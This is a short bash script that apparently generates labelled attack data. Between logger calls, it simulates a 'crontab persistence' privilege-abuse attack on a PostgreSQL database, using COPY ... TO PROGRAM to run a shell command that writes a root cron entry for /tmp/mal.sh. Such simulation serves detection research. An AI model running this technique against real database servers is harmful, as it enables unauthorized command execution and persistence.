#!/bin/bash
echo "Simulating Privilege Abuse Attack (crontab_persist)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_crontab_persist" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'echo '* * * * * root /tmp/mal.sh' >> /tmp/crontab.bak > /tmp/out_crontab_persist.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_crontab_persist" end
